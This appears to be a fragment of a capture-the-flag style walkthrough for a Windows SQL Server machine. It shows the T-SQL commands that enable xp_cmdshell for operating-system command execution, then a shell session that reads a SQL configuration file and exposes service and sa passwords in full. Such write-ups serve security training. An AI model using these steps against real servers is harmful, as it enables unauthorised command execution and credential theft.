


## Escape Two

## Use the advanced xp_cmdshell to perform 

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami'
```

#### Credentials found!

```bash
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI             
                              type sql-Configuration.INI             
type sql-Configuration.INI                                           
[OPTIONS]                                                            
ACTION="Install"                                                     
QUIET="True"                                                         
FEATURES=SQL                                                         
INSTANCENAME="SQLEXPRESS"                                            
INSTANCEID="SQLEXPRESS"                                              
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"                    
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"                         
AGTSVCSTARTUPTYPE="Manual"                                           
COMMFABRICPORT="0"                                                   
COMMFABRICNETWORKLEVEL=""0"                                          
COMMFABRICENCRYPTION="0"                                             
MATRIXCMBRICKCOMMPORT="0"                                            
SQLSVCSTARTUPTYPE="Automatic"                                        
FILESTREAMLEVEL="0"                                                  
ENABLERANU="False"                                                   
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"                          
SQLSVCACCOUNT="SEQUEL\sql_svc"                                       
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                                    
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"                           
SECURITYMODE="SQL"                                                   
SAPWD="MSSQLP@ssw0rd!"                                               
ADDCURRENTUSERASSQLADMIN="False"                                     
TCPENABLED="1"                                                       
NPENABLED="1"                                                        
BROWSERSVCSTARTUPTYPE="Automatic"                                    
IAcceptSQLServerLicenseTerms=True                                    
PS C:\SQL2019\ExpressAdv_ENU> pwd                                    
                              pwd                                    
pwd                                                                  
                                                                     
Path                                                                 
----                                                                 
C:\SQL2019\ExpressAdv_ENU                                            
```
